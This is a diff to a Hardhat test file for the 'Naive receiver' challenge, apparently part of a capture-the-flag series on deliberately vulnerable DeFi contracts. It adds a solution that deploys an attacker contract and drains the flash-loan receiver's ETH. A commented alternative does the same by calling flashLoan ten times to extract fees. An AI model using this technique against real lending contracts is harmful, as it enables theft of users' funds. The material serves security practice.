@@ -1,6 +1,10 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+// const LenderPool = contract.fromArtifact("NaiveReceiverLenderPool");
+// const FlashLoanReceiver = contract.fromArtifact("FlashLoanReceiver");
+// const NaiveReceiverAttacker = contract.fromArtifact("NaiveReceiverAttacker");
+
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
 
@@ -31,6 +35,17 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const NaiveAttacker = await ethers.getContractFactory('NaiveAttacker', attacker)
+        this.attackerContract = await NaiveAttacker.deploy(this.pool.address)
+        console.log('Balance before attacking: ', String(await ethers.provider.getBalance(this.receiver.address)))
+        await this.attackerContract.connect(attacker).attack(this.receiver.address)
+        console.log('Balance after attacking: ', String(await ethers.provider.getBalance(this.receiver.address)))
+
+        // ALT: LOOP AND CALL FLASHLOAN TO EXTRACT 1ETH 10 TIMES
+        // for (i = 1; i <= 10; i++) {
+        //     await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+        //     console.log(i, String(await ethers.provider.getBalance(this.receiver.address)));
+        // }
     });
 
     after(async function () {
